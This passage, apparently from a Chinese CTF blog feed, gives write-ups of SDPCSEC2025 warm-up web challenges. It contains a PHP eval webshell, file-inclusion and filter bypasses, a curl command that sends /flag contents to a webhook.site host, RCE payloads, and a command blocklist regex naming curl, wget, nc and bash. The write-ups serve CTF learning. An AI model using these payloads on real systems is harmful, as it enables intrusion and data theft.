ä¸­å¯ä»¥çœ‹è§ä¸€ä¸ªæ–‡ä»¶ï¼Œè®¿é—®åå†phpinfoä¸­çœ‹è§è¿‡æ»¤äº†å¾ˆå¤šå†…å®¹ï¼Œä½†æ˜¯ highlight_file å‡½æ•°å¯ä»¥å®Œç¾ç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">?Jail[by.Happy=highlight_file(glob(&quot;/f*&quot;)[0]);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SDPCSEC2025çƒ­èº«èµ›</title>
    <link href="/2025/11/19/SDPC2025%E7%83%AD%E8%BA%AB%E8%B5%9B/"/>
    <url>/2025/11/19/SDPC2025%E7%83%AD%E8%BA%AB%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h1><p>phpå›¾ç‰‡é©¬</p><p>ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ç„¶åæ‹¦æˆªè¯·æ±‚ï¼Œä¿®æ”¹æ–‡ä»¶åç¼€ååŠå†…å®¹ï¼Œæ¤å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="rHeEsApDoEnRsSe"><a href="#rHeEsApDoEnRsSe" class="headerlink" title="rHeEsApDoEnRsSe"></a>rHeEsApDoEnRsSe</h1><p>æ ¹æ®é¢˜ç›®ååŠé¡µé¢æç¤ºï¼Œflagåœ¨å“åº”å¤´é‡Œé¢ï¼Œä½¿ç”¨curlå‘½ä»¤</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-punctuation">-</span>I http<span class="hljs-punctuation">:</span><span class="hljs-comment">//175.27.251.122:32999/</span><br></code></pre></td></tr></table></figure><p><code>curl</code> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œä¸»è¦ç”¨äºåœ¨ç½‘ç»œä¸Šä¼ è¾“æ•°æ®ï¼Œæ”¯æŒå¤šç§åè®®ï¼ˆå¦‚ HTTPã€HTTPSã€FTPã€SFTP ç­‰ï¼‰ï¼Œå¸¸è¢«ç”¨äºæµ‹è¯•æ¥å£ã€ä¸‹è½½æ–‡ä»¶ã€å‘é€è¯·æ±‚ç­‰åœºæ™¯ã€‚ä»¥ä¸‹æ˜¯å…¶æ ¸å¿ƒç”¨æ³•æ€»ç»“ï¼š</p><ol><li><strong>åŸºæœ¬è¯·æ±‚</strong><ul><li>å‘é€ GET è¯·æ±‚ï¼ˆé»˜è®¤ï¼‰ï¼š<code>curl [URL]</code>ï¼Œå¦‚ <code>curl https://example.com</code></li><li>å‘é€ POST è¯·æ±‚ï¼š<code>curl -X POST [URL]</code>ï¼Œå¯æ­é… <code>-d</code> ä¼ é€’æ•°æ®ï¼Œå¦‚ <code>curl -X POST -d &quot;name=test&quot; https://example.com/api</code></li></ul></li><li><strong>è®¾ç½®è¯·æ±‚å¤´</strong>ç”¨ <code>-H</code> æŒ‡å®šè¯·æ±‚å¤´ï¼Œå¦‚æ¨¡æ‹Ÿæµè§ˆå™¨ï¼š<code>curl -H &quot;User-Agent: Mozilla/5.0&quot; https://example.com</code></li><li><strong>ä¸‹è½½æ–‡ä»¶</strong><ul><li>ä¿å­˜ä¸ºæŒ‡å®šæ–‡ä»¶åï¼š<code>curl -o æ–‡ä»¶å [URL]</code>ï¼ˆå¦‚ <code>curl -o file.zip https://example.com/file.zip</code>ï¼‰</li><li>è‡ªåŠ¨ä»¥è¿œç¨‹æ–‡ä»¶åä¿å­˜ï¼š<code>curl -O [URL]</code>ï¼ˆURL éœ€æŒ‡å‘å…·ä½“æ–‡ä»¶ï¼‰</li></ul></li><li><strong>å¤„ç†è®¤è¯</strong><ul><li>åŸºç¡€è®¤è¯ï¼š<code>curl -u ç”¨æˆ·å:å¯†ç  [URL]</code></li><li>æºå¸¦ Cookieï¼š<code>curl -b &quot;cookie1=value1&quot; [URL]</code>ï¼Œæˆ–ä¿å­˜å“åº” Cookie åˆ°æ–‡ä»¶ï¼š<code>curl -c cookies.txt [URL]</code></li></ul></li><li><strong>å…¶ä»–å¸¸ç”¨é€‰é¡¹</strong><ul><li>æ˜¾ç¤ºè¯¦ç»†è¯·æ±‚è¿‡ç¨‹ï¼š<code>curl -v [URL]</code></li><li>è·Ÿéšé‡å®šå‘ï¼š<code>curl -L [URL]</code></li><li>é™åˆ¶ä¼ è¾“é€Ÿåº¦ï¼š<code>curl --limit-rate 100k [URL]</code>ï¼ˆå¦‚é™åˆ¶ä¸º 100KB&#x2F;sï¼‰</li><li>è¯·æ±‚å¤´ï¼š<code>curl -I</code></li></ul></li></ol><h1 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h1><p>é¦–å…ˆå‘ç°åªæœ‰ä¸€è¡Œä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zpf&#x27;</span>])<br></code></pre></td></tr></table></figure><p>includeå¯ä»¥åŒ…å«æ–‡ä»¶ï¼Œå¦‚txtæ–‡æœ¬æ ¼å¼ï¼Œå¹¶æŠŠåŒ…å«çš„æ–‡ä»¶å½“ä½œphpä»£ç è§£ææ‰§è¡Œã€‚</p><p>é¦–å…ˆå°è¯•åˆ©ç”¨<code>?zpf=/etc/passwd</code> è¯»å–ç³»ç»Ÿç›®å½•ï¼Œä½†å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p><p>ä¸‹é¢å°è¯•åˆ©ç”¨<code>?zpf=php://filter/convert.base64-encode/resource=index.php</code> è·å–æºç </p><p>ç»è¿‡Base64è§£ç åå¾—åˆ°æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zpf&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;include(\$_GET[&#x27;zpf&#x27;])&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$a</span>);<br>        <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(union|cat|tac|more|less|ls|tree|env|head|tail|nl|sed|awk|grep|strings|od|xxd|curl|wget|nc|netcat|python|perl|ruby|bash|sh|zsh|ksh|tcsh|cmd|powershell)/i&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yzx&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Dangerous command detected!&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yzx&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å‘ç°äº†éå¸¸å…³é”®çš„systemå‡½æ•°ï¼Œä½†ç¨‹åºå¯¹yzxè¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç»•è¿‡æ­£åˆ™è¿‡æ»¤ï¼Œæ‰§è¡Œå‘½ä»¤</p><p>è¿™é‡Œæˆ‘ä½¿ç”¨äº†è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼ŒæˆåŠŸè¯»å–äº†ç›®å½•æ‹¿åˆ°äº†flag</p><hr><h4 id="å¸¸ç”¨çš„ä¼ªåè®®"><a href="#å¸¸ç”¨çš„ä¼ªåè®®" class="headerlink" title="å¸¸ç”¨çš„ä¼ªåè®®"></a>å¸¸ç”¨çš„ä¼ªåè®®</h4><ul><li>php:&#x2F;&#x2F;filter è¯»å–æ–‡ä»¶æºç  ï¼ˆåè®®å¯ä»¥å¯¹æ‰“å¼€çš„æ•°æ®æµè¿›è¡Œç­›é€‰å’Œè¿‡æ»¤,å¸¸ç”¨äºè¯»å–æ–‡ä»¶æºç ï¼‰</li><li>php:&#x2F;&#x2F;input ä»»æ„ä»£ç æ‰§è¡Œ;è¿™ç§ä¼ªåè®®ç”¨äºè¯»å–åŸå§‹çš„ HTTP POST æ•°æ®ï¼Œå¯ä»¥ç”¨äºå¤„ç†ä¸Šä¼ çš„æ–‡ä»¶å’Œè¡¨å•æ•°æ®ã€‚</li><li>data:&#x2F;&#x2F;text&#x2F;plain ä»»æ„ä»£ç æ‰§è¡Œ</li><li>zip:&#x2F;&#x2F; é…åˆæ–‡ä»¶ä¸Šä¼ å¼€å¯åé—¨</li></ul><h4 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p><a href="https://developer.aliyun.com/article/1224913">æ­£åˆ™è¿‡æ»¤ç»•è¿‡</a></p><p><a href="https://blog.csdn.net/lilongsy/article/details/108146107">æ–‡ä»¶åŒ…å«æ¼æ´</a></p><h1 id="è²Œåˆç¥ç¦»"><a href="#è²Œåˆç¥ç¦»" class="headerlink" title="è²Œåˆç¥ç¦»"></a><strong>è²Œåˆç¥ç¦»</strong></h1><p>md5å¤§æ‚çƒ©</p><h4 id="å‚è€ƒæ–‡çŒ®-1"><a href="#å‚è€ƒæ–‡çŒ®-1" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p><a href="https://www.cnblogs.com/Yolololo/p/18161894">MD5ç»•è¿‡</a></p><p><a href="https://www.cnblogs.com/dre0m1/p/16062369.html">PHPä¸­MD5å’Œsha1ç»•è¿‡æ–¹å¼æ€»ç»“ - dre0m1 - åšå®¢å›­</a></p><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">æ€»ç»“ctfä¸­ MD5 ç»•è¿‡çš„ä¸€äº›æ€è·¯_ctf md5ç»•è¿‡-CSDNåšå®¢</a></p><p><a href="https://www.dr0n.top/posts/ad669f62/">CTFä¸­å…³äºmd5çš„ä¸€äº›æ€»ç»“ - Dr0nâ€™s blog</a></p><h1 id="ç©ºè°·æ— éŸ³"><a href="#ç©ºè°·æ— éŸ³" class="headerlink" title="ç©ºè°·æ— éŸ³"></a>ç©ºè°·æ— éŸ³</h1><p>é¦–å…ˆå‘ç°å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œç»“åˆé¢˜ç›®æè¿°ï¼Œè€ƒè™‘ç”¨å…¶ä»–æ–¹å¼è¿›è¡Œå¤–å¸¦</p><ul><li>é‡å®šå‘åˆ°æ–‡ä»¶</li></ul><p>æˆ‘ä»¬å¯ä»¥ç”¨æµé‡å®šå‘ç¬¦å·æ¥å°†è¾“å‡ºå†…å®¹é‡å®šå‘åˆ°æ–‡ä»¶ä¸­, åœ¨é€šè¿‡æµè§ˆå™¨è¿›è¡Œä¸‹è½½</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">cmd_here &gt; 1.txt<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥é€šè¿‡è®¿é—® 1.txt è·å–åˆ°è¾“å‡ºå†…å®¹äº†</p><ul><li>é€šè¿‡ <code>curl</code> å¤–å¸¦</li></ul><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <a href="https://webhook.site/">https://webhook.site/</a> æ¥è¿›è¡Œæ•°æ®å¤–å¸¦, æˆ‘ä»¬å¯ä»¥æ‹¿åˆ°è¿™æ ·ä¸€ä¸ªé“¾æ¥</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶è¿™ä¸ªè·¯å¾„ä¸‹çš„æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«è®°å½•</p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡shellæŒ‡ä»¤:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag | base64`<br></code></pre></td></tr></table></figure><ul><li>DNSlogå¤–å¸¦</li></ul><h4 id="å‚è€ƒæ–‡çŒ®-2"><a href="#å‚è€ƒæ–‡çŒ®-2" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p><a href="/html/dnslog.html">DNSlogå¤–å¸¦</a></p><h1 id="åº”å£°"><a href="#åº”å£°" class="headerlink" title="åº”å£°"></a>åº”å£°</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Pr0&#x27;</span>];<br><span class="hljs-variable">$Acc1o</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Acc1o&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Pr0</span> === <span class="hljs-string">&#x27;Pr0&#x27;</span> &amp;&amp; <span class="hljs-variable">$Acc1o</span> === <span class="hljs-string">&#x27;Acc1o&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿä»£ç ï¼Œå‘ç°è¦æ±‚POST Pr0&#x3D;Pr0,GET Acc1o&#x3D;Acc1o,ç„¶åæ‰§è¡Œcmdä¸­çš„ä»£ç ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X POST &quot;http://175.27.251.122:33036/?Acc1o=Acc1o&quot; -d &quot;Pr0=Pr0&amp;cmd=system(&#x27;cat /flag;&#x27;);&quot;<br></code></pre></td></tr></table></figure><h4 id="å‚è€ƒæ–‡çŒ®-3"><a href="#å‚è€ƒæ–‡çŒ®-3" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p><a href="https://blog.csdn.net/m0_73185293/article/details/131557169">RCEæ¼æ´è¯¦è§£</a></p><p><a href="https://blog.csdn.net/u013372487/article/details/46009075">PHPæ•°æ®æ¥å—å˜é‡</a></p><h1 id="æ°è‰¾æ€ä¸æƒ³è®©ä½ çœ‹"><a href="#æ°è‰¾æ€ä¸æƒ³è®©ä½ çœ‹" class="headerlink" title="æ°è‰¾æ€ä¸æƒ³è®©ä½ çœ‹"></a>æ°è‰¾æ€ä¸æƒ³è®©ä½ çœ‹</h1><p>é¦–å…ˆå‘ç°å‰ç«¯æ— æ³•æŸ¥çœ‹æºç ï¼Œè€Œæç¤ºå°±åœ¨æºç é‡Œé¢ï¼Œæ‰€ä»¥ä½¿ç”¨burpç»•è¿‡å‰ç«¯è·å¾—æºç ã€‚</p><p>åœ¨æºç ä¸­å‘ç°ä¸€ä¸ªæ–‡ä»¶S3crett.phpï¼Œæ‰“å¼€å¾—åˆ°ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_eval</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/flag/i&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no hacker!!&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] ?? <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">safe_eval</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å‘ç°å®ƒå¯¹cmdè¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤ï¼Œä¸èƒ½å‡ºç°flag</p><p>é¦–å…ˆè€ƒè™‘å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ï¼Œäº§ç”ŸæŠ¥é”™ã€‚</p><p>å†å°è¯•ä½¿ç”¨base64ç¼–ç ç»•è¿‡<code>cmd=system(base64_decode(&quot;Y2F0IC9mbGFn&quot;));</code> æˆåŠŸæ‹¿åˆ°flag</p><h1 id="å…­å±‚å¦–å¡”"><a href="#å…­å±‚å¦–å¡”" class="headerlink" title="å…­å±‚å¦–å¡”"></a>å…­å±‚å¦–å¡”</h1><p>æœ¬é¢˜è€ƒæŸ¥HTTPå¤´éƒ¨ä¼ªé€ æŠ€æœ¯</p><ul><li>ä¼ªé€ æœ¬åœ°IPï¼š<code>X-Forwarded-For: 127.0.0.1</code></li><li>ä¼ªé€ é¡µé¢æ¥æºï¼š<code>Referer: https://æœåŠ¡å™¨è¦æ±‚çš„åˆæ³•æ¥æºåŸŸå/</code></li><li>ä¼ªé€ æµè§ˆå™¨ï¼š</li><li>ä¼ªé€ ç”¨æˆ·èº«ä»½ï¼š<code>Cookie: User=Acc1oFl4g</code></li><li>ä¼ªé€ ä»£ç†æœåŠ¡å™¨ï¼š<code>Via: 1.1 123.56.103.169 (Proxy/1.0)</code></li></ul><h1 id="ez-sssseria"><a href="#ez-sssseria" class="headerlink" title="ez_sssseria"></a>ez_sssseria</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// flag in /flag</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cos1ne</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> === <span class="hljs-string">&quot;flag2&quot;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;role) &amp;&amp; <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$this</span>-&gt;role)) &#123;<br>                (<span class="hljs-variable language_">$this</span>-&gt;role)();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ziran</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$temp</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;data-&gt;<span class="hljs-title function_ invoke__">flag2</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pr0</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;username) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;password)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;username-&gt;<span class="hljs-title function_ invoke__">flag1</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yi</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&#x27;Acc1oFl4g&#x27;</span>)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;username-&gt;<span class="hljs-title function_ invoke__">Acc1oFl4g</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acc1o</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;role = <span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;data) != <span class="hljs-string">&#x27;dislike&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;nice&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Acc1oFl4g</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;key));<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span 